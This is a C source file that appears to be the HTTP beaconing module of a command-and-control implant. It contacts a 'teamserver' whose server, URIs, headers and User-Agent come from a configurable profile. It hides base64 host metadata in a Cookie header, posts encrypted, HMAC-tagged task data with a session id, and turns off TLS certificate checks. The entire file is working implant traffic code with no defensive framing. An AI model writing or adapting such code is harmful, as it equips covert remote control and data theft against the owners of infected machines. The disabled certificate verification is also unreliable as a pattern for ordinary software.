#include "http.h"
#include "crypto.h"
#include "profile.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include "debug.h"

// Callback for CURL to write response data
static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t real_size = size * nmemb;
    http_response_t *response = (http_response_t *)userp;
    
    char *new_data = realloc(response->data, response->size + real_size + 1);
    if (!new_data) {
        return 0;
    }
    
    response->data = new_data;
    memcpy(response->data + response->size, contents, real_size);
    response->size += real_size;
    response->data[response->size] = 0;
    
    return real_size;
}

int http_get(const char *uri,
             const uint8_t *metadata,
             size_t metadata_len,
             http_response_t *response)
{
    CURL *curl;
    CURLcode res;
    long response_code;

    response->data = NULL;
    response->size = 0;

    curl = curl_easy_init();
    if (!curl) {
        ERROR_PRINT("Failed to initialize CURL\n");
        return -1;
    }

    // Build full URL
    const char *resolved_uri = uri ? uri : profile_get_http_get_uri();
    char url[512];
    if (profile_get_use_https()) {
        snprintf(url, sizeof(url), "https://%s:%d%s", profile_get_server(), profile_get_port(), resolved_uri);
        // The following two options are needed to support teamserver with untrusted (such as self-signed) certificates
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    } else {
        snprintf(url, sizeof(url), "http://%s:%d%s", profile_get_server(), profile_get_port(), resolved_uri);
    }

    //DEBUG_PRINT("GET URL: %s\n", url);
    //DEBUG_PRINT("Metadata length: %zu bytes\n", metadata_len);

    // Setup headers
    struct curl_slist *headers = NULL;

    // Profile-defined static headers
    size_t header_count = profile_get_header_count();
    size_t header_idx = 0;
    for (header_idx = 0; header_idx < header_count; ++header_idx) {
        const char *profile_header = profile_get_header(header_idx);
        if (profile_header && profile_header[0] != '\0') {
            headers = curl_slist_append(headers, profile_header);
        }
    }

    // User-Agent
    char ua_header[512];
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", profile_get_user_agent());
    headers = curl_slist_append(headers, ua_header);

    // Cookie header (only if metadata present)
    if (metadata && metadata_len > 0) {
        char *b64_metadata = base64_encode(metadata, metadata_len);
        if (!b64_metadata) {
            ERROR_PRINT("Failed to base64 encode metadata\n");
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
            return -1;
        }

        char cookie_header[4096];
        snprintf(cookie_header, sizeof(cookie_header), "Cookie: %s", b64_metadata);
        headers = curl_slist_append(headers, cookie_header);

        free(b64_metadata);
    }

    // Configure CURL
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

// #ifdef DEBUG
    // curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
// #endif

    // Perform request
    res = curl_easy_perform(curl);

    // Response code
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    //DEBUG_PRINT("HTTP Response Code: %ld\n", response_code);
    //DEBUG_PRINT("Response size: %zu bytes\n", response->size);

    // Cleanup
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        ERROR_PRINT("CURL error: %s\n", curl_easy_strerror(res));
        free(response->data);
        response->data = NULL;
        return -1;
    }

    if (response_code != 200) {
        ERROR_PRINT("Server returned HTTP %ld\n", response_code);
    }

    return 0;
}

int http_post(const char *uri, const uint8_t *data, size_t data_len,
              const char *session_id, http_response_t *response) {

    // Build packet structure:
    // [Total Length: 4 bytes - UNENCRYPTED, BIG-endian] <- size of encrypted data only
    // [ENCRYPTED: Counter:4 | Data Size:4 | Type:4 | Task Data:N]
    // [HMAC: 16 bytes]

    CURL *curl;
    CURLcode res;
    long response_code;
    
    response->data = NULL;
    response->size = 0;
    
    curl = curl_easy_init();
    if (!curl) {
        ERROR_PRINT("Failed to initialize CURL\n");
        return -1;
    }
    
    // Build full URL with session ID parameter
    const char *resolved_uri = uri ? uri : profile_get_http_post_uri();
    char url[512];
    if (profile_get_use_https()) {
        snprintf(url, sizeof(url), "https://%s:%d%s?id=%s", profile_get_server(), profile_get_port(), resolved_uri, session_id);
        // The following two options are needed to support teamserver with untrusted (such as self-signed) certificates
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    } else {
        snprintf(url, sizeof(url), "http://%s:%d%s?id=%s", profile_get_server(), profile_get_port(), resolved_uri, session_id);
    }
    
    DEBUG_PRINT("POST URL: %s\n", url);
    DEBUG_PRINT("POST data length: %zu bytes\n", data_len);
    
    // Setup headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    
    char ua_header[512];
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", profile_get_user_agent());
    headers = curl_slist_append(headers, ua_header);
    
    // Configure CURL
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)data_len);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    
    // #ifdef DEBUG
    // curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    // #endif
    
    // Perform the request
    res = curl_easy_perform(curl);
    
    // Get response code
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    DEBUG_PRINT("HTTP Response Code: %ld\n", response_code);
    DEBUG_PRINT("Response size: %zu bytes\n", response->size);
    
    // Cleanup
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        ERROR_PRINT("CURL error: %s\n", curl_easy_strerror(res));
        if (response->data) {
            free(response->data);
            response->data = NULL;
        }
        return -1;
    }
    
    if (response_code != 200) {
        ERROR_PRINT("Server returned HTTP %ld\n", response_code);
    }
    
    return 0;
}

void http_response_free(http_response_t *response) {
    if (response->data) {
        free(response->data);
        response->data = NULL;
    }
    response->size = 0;
}
